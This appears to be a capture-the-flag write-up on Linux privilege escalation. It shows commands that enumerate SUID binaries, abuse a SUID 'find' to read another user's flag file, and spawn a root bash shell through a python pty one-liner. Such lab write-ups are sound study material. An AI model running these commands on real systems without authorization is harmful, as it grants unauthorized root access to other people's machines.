Escalation
==========

This task was really easy, I found the root privelege escalation before
the user privelege escalation though

To view files as the user igor, I first searched for binaries belonging
to igor:

    # The -print option is nice because it can replace the long winded -exec ls -ldb {} \;
    find / -user igor -perm -4000 -print 2>/dev/null

We found a /usr/bin/find binary and exploited it with the following
command to print the contents of flag1.txt:

    /usr/bin/find /home/igor -name flag1.txt -exec cat {} \;

For root permissions, I ran a find command to view all binaries executed
as root:

    find / -user root -perm -4000 -print 2>/dev/null

We found a system-control binary which allows you to execute one command
as root, to make things a little more fun I spawned a shell rather than
cat'ing out the file contents immediately:

    python -c 'import pty;pty.spawn("/bin/bash")'
